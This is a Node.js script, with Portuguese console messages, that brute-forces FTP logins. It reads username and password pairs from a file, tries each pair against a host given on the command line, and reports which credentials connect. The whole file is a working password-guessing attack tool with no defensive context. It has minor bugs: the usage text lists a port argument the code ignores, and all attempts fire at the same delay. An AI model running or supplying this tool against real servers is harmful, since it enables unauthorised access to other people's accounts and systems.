import Ftp from 'ftp';
import fs from 'fs';

const data = {
    host: process.argv[2],
    port: 21,
    locale: process.argv[3],
};

console.log(data);

const lines = fs.readFileSync(data.locale, 'utf-8').split('\n');

(() => {

    if (!data.host || !data.locale) {
        console.log('Faltam argumentos para a execução do script! Ex: node forceftp.js [host] [port] [file]');
        return;
    }

    console.log('Iniciando força bruta...');

    const promises = [];
    
    for (let line of lines) {
        line = line.trim();
        const [user, pass] = line.split(' ');
        
        setTimeout( async () => {
            var ftp = new Ftp();

            ftp.on('ready', () => {
                console.log(`Conectado com sucesso! User: ${user} e Pass: ${pass}`);
                ftp.end();
            });
        
            ftp.on('error', () => {
                console.log('Error: User:', user,', Pass: ', pass, " ==> incorreto ou servidor não encontrado!");
                ftp.end();
            });

            await new Promise((resolve, reject) => {

                ftp.connect({
                    host: data.host,
                    user: user,
                    password: pass,
                    port: data.port,
                    connTimeout: 3000,
                });
            });
        } , 5000);
    }
})();
